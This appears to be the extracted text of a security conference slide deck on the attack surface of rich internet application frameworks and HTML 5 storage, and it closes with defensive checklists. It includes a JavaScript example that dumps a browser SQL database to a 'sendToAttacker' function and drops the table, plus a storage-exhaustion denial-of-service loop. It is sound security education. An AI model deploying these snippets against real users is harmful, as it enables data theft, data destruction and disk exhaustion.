Scenarios
RIA vs OS
RIA vs the web
Mozilla Prism
Prism Install UI
Living in the
RIA World
Introduction
Who are we?
What’s a RIA?
Why use RIA?
Frameworks
Adobe AIR
MS Silverlight
Google Gears
Mozilla Prism
HTML 5
Attack
Scenarios
RIA vs OS
RIA vs the web
Mozilla Prism
Abuse
Looks like a bookmark dialog
No warnings for install
Full XPCOM scripting privileges
Low bar for trojans and malicious code — a malicious
browser extension, but with no code signing or warning
Living in the
RIA World
Introduction
Who are we?
What’s a RIA?
Why use RIA?
Frameworks
Adobe AIR
MS Silverlight
Google Gears
Mozilla Prism
HTML 5
Attack
Scenarios
RIA vs OS
RIA vs the web
Mozilla Prism
Demo
Demo
Living in the
RIA World
Introduction
Who are we?
What’s a RIA?
Why use RIA?
Frameworks
Adobe AIR
MS Silverlight
Google Gears
Mozilla Prism
HTML 5
Attack
Scenarios
RIA vs OS
RIA vs the web
HTML 5
New “features” in Firefox and WebKit
Introduces DOM storage — sessionStorage and
localStorage
sessionStorage stores arbitrary amounts of data for a single
session
localStorage persists beyond the session — never expires,
limited to 5M
Database storage via openDatabase()
All expected to be same-origin
Living in the
RIA World
Introduction
Who are we?
What’s a RIA?
Why use RIA?
Frameworks
Adobe AIR
MS Silverlight
Google Gears
Mozilla Prism
HTML 5
Attack
Scenarios
RIA vs OS
RIA vs the web
DOM Storage
The major goals of DOM storage — more storage space
and real persistence
Cookies considered too small
Users delete cookies, or won’t accept them
DOM storage bypasses pesky users
However, pesky users can use:
about:conﬁg dom.storage.enabled = false
Living in the
RIA World
Introduction
Who are we?
What’s a RIA?
Why use RIA?
Frameworks
Adobe AIR
MS Silverlight
Google Gears
Mozilla Prism
HTML 5
Attack
Scenarios
RIA vs OS
RIA vs the web
Browser-based SQL Databases
DatabaseJacking
Injection attacks become far more damaging when you can
insert code like this:
var
db=openDatabase ( "e-mail" ,
[ ] ,
"My
precious e-mail" ,
"3.14" ) ;
a l l m e s s a g e s=db . e x e c u t e S q l ( "SELECT * FROM
MSGS" ,
[ ] ,
f u n c t i o n ( r e s u l t s ) {
sendToAttacker ( r e s u l t s ) ;
}
) ;
db . e x e c u t e S q l ( "DROP
TABLE
MESSAGES" ,
[ ] ,
f u n c t i o n () {
a l e r t ( "lol" ) ;
}
) ;
Living in the
RIA World
Introduction
Who are we?
What’s a RIA?
Why use RIA?
Frameworks
Adobe AIR
MS Silverlight
Google Gears
Mozilla Prism
HTML 5
Attack
Scenarios
RIA vs OS
RIA vs the web
Firefox 3
Mozilla-speciﬁc issues
Cross-Site XMLHttpRequest — removed in late FF3
betas, but it may return
globalStorage
FF2 has weak same-origin restrictions
FF2 and FF3 both omit any UI to view/change/delete
Deprecated in HTML 5 for localStorage
The RIA world is totally SQL-happy
Downloads, cookies, form history, search history, etc, all
stored in local SQLite databases
Why?? This data isn’t relational.
Living in the
RIA World
Introduction
Who are we?
What’s a RIA?
Why use RIA?
Frameworks
Adobe AIR
MS Silverlight
Google Gears
Mozilla Prism
HTML 5
Attack
Scenarios
RIA vs OS
RIA vs the web
Firefox 3
Additional fun
Speaking of tracking and data storage. . .
Did you have History turned oﬀ? FF3 turned it back on.
Also new in FF3: nsIdleService — idle tracking through
XPCOM
EXSLT — eXtensible Stylesheet Language
Transformations weren’t extensible enough, so here are the
extensions.
Websites can now be protocol handlers — a novel way to
implement spyware
Living in the
RIA World
Introduction
Who are we?
What’s a RIA?
Why use RIA?
Frameworks
Adobe AIR
MS Silverlight
Google Gears
Mozilla Prism
HTML 5
Attack
Scenarios
RIA vs OS
RIA vs the web
Webkit
The Lurking Menace
Used in Safari, iPhone, Android, OpenMoko, Konqueror
Supports HTML 5 DOM storage mechanisms
Particularly crucial on mobile devices, where storage is at a
premium
Living in the
RIA World
Introduction
Who are we?
What’s a RIA?
Why use RIA?
Frameworks
Adobe AIR
MS Silverlight
Google Gears
Mozilla Prism
HTML 5
Attack
Scenarios
RIA vs OS
RIA vs the web
Inherent DoS Risks in HTML 5
5M per origin for database objects
5M per origin for localStorage
5M per origin for globalStorage (in Firefox)
Thankfully, no one has hundreds of thousands of origins
Except people on internal class A networks
Or anyone with wildcard DNS
Trivial storage exhaustion attacks possible
Even more so for mobile devices based on WebKit — plus,
storage and RAM are often pooled on these
No exposed UI to disable this
Living in the
RIA World
Introduction
Who are we?
What’s a RIA?
Why use RIA?
Frameworks
Adobe AIR
MS Silverlight
Google Gears
Mozilla Prism
HTML 5
Attack
Scenarios
RIA vs OS
RIA vs the web
DoS Risks in HTML 5
Attack Scenarios
Attacker sets up or compromises web server with wildcard
DNS
Upon page visitation of the main virtual host, an IFRAME
loads which runs Javascript like this:
f u n c t i o n
s t o r e t h i n g s (name) {
g l o b a l S t o r a g e [ ’ c y b e r v i l l a i n s . org ’ ] [ name ] = "Hi there , from
iSEC!" ;
}
f u n c t i o n
mul0
( s t r ,
num) {
i f
( ! num)
r e t u r n
"" ;
var
newStr = s t r ;
w h i l e (−−num)
newStr += s t r ;
r e t u r n
newStr ;
}
var
i = 0;
w h i l e
( i < 10000) {
whee = mul0 ( "A" ,10000) ;
s t o r e t h i n g s ( whee + i ) ;
i ++;
}
Living in the
RIA World
Introduction
Who are we?
What’s a RIA?
Why use RIA?
Frameworks
Adobe AIR
MS Silverlight
Google Gears
Mozilla Prism
HTML 5
Attack
Scenarios
RIA vs OS
RIA vs the web
DoS Risks in HTML 5
Attack Scenarios
Each request loads a page instantiating globalStorage
and/or localStorage and database objects
Fill the victim’s hard drive with incriminating evidence —
base64-encoded images/ﬁles, etc. . .
Living in the
RIA World
Introduction
Who are we?
What’s a RIA?
Why use RIA?
Frameworks
Adobe AIR
MS Silverlight
Google Gears
Mozilla Prism
HTML 5
Attack
Scenarios
RIA vs OS
RIA vs the web
Other HTML 5 features not yet implemented
Coming soon to a browser near you
TCP Connections! Direct ones and broadcast.
Section 7.3.8, Security: “Need to write this section.” 1
1http://www.w3.org/html/wg/html5/
Living in the
RIA World
Introduction
Who are we?
What’s a RIA?
Why use RIA?
Frameworks
Adobe AIR
MS Silverlight
Google Gears
Mozilla Prism
HTML 5
Attack
Scenarios
RIA vs OS
RIA vs the web
RIA vs OS
Storage
All of these frameworks expand the capabilities to store
data locally
Introduce privacy/tracking concerns
DoS risk against desktops and mobile devices
Living in the
RIA World
Introduction
Who are we?
What’s a RIA?
Why use RIA?
Frameworks
Adobe AIR
MS Silverlight
Google Gears
Mozilla Prism
HTML 5
Attack
Scenarios
RIA vs OS
RIA vs the web
RIA vs OS
Malware
Adobe AIR is a desktop application framework
AIR can easily seed malware
The eﬀectiveness of malware attacks will be directly
related to the popularity of the platform and the ease of
install
Large media attack surfaces pose another option
Living in the
RIA World
Introduction
Who are we?
What’s a RIA?
Why use RIA?
Frameworks
Adobe AIR
MS Silverlight
Google Gears
Mozilla Prism
HTML 5
Attack
Scenarios
RIA vs OS
RIA vs the web
RIA vs the web
Or vice versa
Most RIA frameworks and HTML 5 include mechanisms
for SQL-based storage
XSS now has access to huge, easily retrievable data stores,
often pre-login
Retrieving query parameters from untrusted sources can
now leads to SQL injection
CSRF from the RIA app to the browser usually still
possible
Silverlight and AIR accept input from calling sites, opening
Flash-like XSS and XSF vulns
Living in the
RIA World
Security
Checklist
RIA Developers
RIA Framework
Vendors
Users and
Administrators
Summary
Q&A
RIA Developer Checklist
Prevent predictably named data stores — use a per-user
GUID embedded in dynamically generated page
Parameterize SQL statements
Lock your AIR app to your domain if possible
Beware of passed-in arguments. Don’t use them in
JavaScript or to fetch URLs
Be very careful with sandbox bridging. Don’t get cute
about bypassing AIR security model
Use Flex or Flash if you don’t need local power of AIR
. . . and you probably don’t
Living in the
RIA World
Security
Checklist
RIA Developers
RIA Framework
Vendors
Users and
Administrators
Summary
Q&A
RIA Framework Vendors
Local Storage Security
Let users opt out.
User choice is missing here
Cookies have been opt-out for ages, but other tracking
mechanisms haven’t caught up
Limit storage invocations
5M per origin is way too much without user interaction,
especially on mobile devices
Living in the
RIA World
Security
Checklist
RIA Developers
RIA Framework
Vendors
Users and
Administrators
Summary
Q&A
RIA Framework Vendors
Install Mechanisms
Learn from Microsoft’s mistakes
They invented RIA with ActiveX
Advantage: Malware
Bad guys can get certs. We have a code signing cert from
Verisign, and we’re professional bad guys
Living in the
RIA World
Security
Checklist
RIA Developers
RIA Framework
Vendors
Users and
Administrators
Summary
Q&A
RIA Framework Vendors
Install Mechanisms
Users will click yes enough to invite abuse
Do not allow self-signed anything without setting an
external developer bit
Install needs to take longer
Watch out for install window DoSing to force a “yes”
Using .exe download and install as baseline is not
acceptable
RIA frameworks need an equivalent to ActiveX killbits
Living in the
RIA World
Security
Checklist
RIA Developers
RIA Framework
Vendors
Users and
Administrators
Summary
Q&A
RIA Framework Vendors
Attack Surfaces
RIA Frameworks are expanding security attack surface
Audio codecs
Video codecs
IL Parser / Virtual Machine
Embedded HTML renderer, JavaScript engine, image
libraries
Users do not understand the danger
Too many exploits will lead to backlash, mass uninstall
Living in the
RIA World
Security
Checklist
RIA Developers
RIA Framework
Vendors
Users and
Administrators
Summary
Q&A
Users and Administrators
Advice for Corporate Admins
Disallow install of RIA frameworks without legitimate
business need
For Windows, GPO can disable per CLSID
Once installed, IEAK becomes useless in enforcing policy in
alternative installers
Discourage development teams from using RIA
unnecessarily
Understand local framework settings that you can set
remotely
Disable self-signed AIR install
Block blobs at border proxy if necessary
Living in the
RIA World
Security
Checklist
RIA Developers
RIA Framework
Vendors
Users and
Administrators
Summary
Q&A
Users and Administrators
Advice for Normal People
Don’t install frameworks you don’t need
Use NoScript or equivalent to block JS/Flash/Silverlight
instantiation except when you want it
Read install boxes carefully
Buy gold, guns, and canned food
Living in the
RIA World
Security
Checklist
RIA Developers
RIA Framework
Vendors
Users and
Administrators
Summary
Q&A
Living in the
RIA World
Security
Checklist
RIA Developers
RIA Framework
Vendors
Users and
Administrators
Summary
Q&A
Summary
RIA frameworks widely diﬀer in their security models
It is highly likely that web developers will introduce
interesting ﬂaws into their desktop applications
The Web is becoming less standardized, more complex,
and much more dangerous
To Be Done
Automated auditing tools for these frameworks are
necessary
Detailed per-framework checklists need to be created
Plenty of bugs to ﬁnd for everyone
Living in the
RIA World
Security
Checklist
RIA Developers
RIA Framework
Vendors
Users and
Administrators
Summary
Q&A
Q&A
Thanks for coming!
Questions?
https://www.isecpartners.com
Living in the
RIA World
Appendix
For Further
Reading
For Further Reading
Lutz Roeder.
Reﬂector for .NET
http://www.aisto.com/roeder/dotnet/
Kevin Kelly, Gary Wolf
Kiss your browser goodbye: The radical future of media
beyond the Web
Wired 5.03. March, 1997
Ian Hickson, David Hyatt
A vocabulary and associated APIs for HTML and XHTML
http://www.w3.org/html/wg/html5/ — July 1 2008